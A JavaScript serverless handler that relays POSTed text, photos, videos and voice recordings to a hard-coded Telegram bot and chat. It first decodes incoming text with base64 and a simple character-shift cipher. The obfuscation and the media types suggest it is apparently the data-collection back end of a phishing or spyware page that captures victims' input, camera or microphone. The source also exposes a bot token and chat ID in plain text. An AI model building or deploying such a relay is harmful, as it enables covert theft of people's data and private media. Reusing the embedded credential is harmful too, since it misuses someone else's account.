export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const BOT_TOKEN = "9011362716:AAHu7AJ1P7dEZCMfs0Mhu8B2U-Df0XnYOOQ";
    const CHAT_ID = "6947664268";

    try {
        let { type, text, caption, data } = req.body;

        // کردنەوەی شفرەی سادە ئەگەر هەبێت
        if (text) {
            try {
                text = atob(text).split('').map(char => String.fromCharCode(char.charCodeAt(0) - 3)).join('');
            } catch(e) {}
        }
        if (caption) {
            try {
                caption = atob(caption).split('').map(char => String.fromCharCode(char.charCodeAt(0) - 3)).join('');
            } catch(e) {}
        }

        let telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        let bodyData = { chat_id: CHAT_ID, text: text || "داتا", parse_mode: "Markdown" };

        if (type === 'photo' && data) {
            telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            // ناردنی وێنە لە ڕێگەی multipart/form-data یان base64 بۆ ئەوەی قورس نەبێت
            bodyData = { chat_id: CHAT_ID, caption: caption || "", photo: data, parse_mode: "Markdown" };
        } else if (type === 'video' && data) {
            telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
            bodyData = { chat_id: CHAT_ID, caption: caption || "", video: data, parse_mode: "Markdown" };
        } else if (type === 'voice' && data) {
            telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
            bodyData = { chat_id: CHAT_ID, caption: caption || "", voice: data, parse_mode: "Markdown" };
        }

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(bodyData)
        });

        const result = await response.json();
        return res.status(200).json({ success: true, result });
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}
